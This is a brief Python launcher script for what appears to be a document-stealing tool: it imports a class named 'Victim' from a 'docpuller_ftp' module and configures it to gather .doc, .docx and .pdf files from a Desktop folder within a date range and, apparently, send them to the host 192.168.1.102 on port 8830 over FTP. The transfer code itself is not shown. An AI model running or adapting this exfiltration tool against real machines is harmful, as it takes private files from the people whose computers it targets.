

from docpuller_scripts.docpuller_ftp.victim_ftp import Victim

def main():

    docPuller = Victim("192.168.1.102", 8830, ['Desktop'], ('.doc', '.docx', '.pdf'), ['DocPuller'], ('2000-01-01', '2023-08-11'))

    docPuller.main()


if __name__ == '__main__':
    main()

                    